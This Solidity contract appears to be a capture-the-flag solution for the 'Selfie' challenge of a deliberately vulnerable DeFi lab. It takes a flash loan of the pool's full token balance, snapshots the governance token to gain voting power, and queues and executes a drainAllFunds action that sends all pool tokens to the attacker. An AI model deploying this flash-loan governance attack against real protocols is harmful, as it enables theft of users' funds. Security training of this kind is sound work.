// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploiter {
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;

    uint256 public actionId;

    constructor(address poolAddress, address governanceAddress, address tokenAddress) public {
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
    }

    function attack() public {
        uint256 balance = token.balanceOf(address(pool));
        pool.flashLoan(balance);
    }

    function attackFinish() public {
        governance.executeAction(actionId);

        uint256 balance = token.balanceOf(address(this));
        token.transfer(msg.sender, balance);
    }

    function receiveTokens(address _token, uint256 amount) external {
        require(address(token) == _token);

        token.snapshot();

        bytes memory data = abi.encodeWithSelector(pool.drainAllFunds.selector, address(this));
        actionId = governance.queueAction(address(pool), data, 0);

        token.transfer(address(pool), amount);
    }
}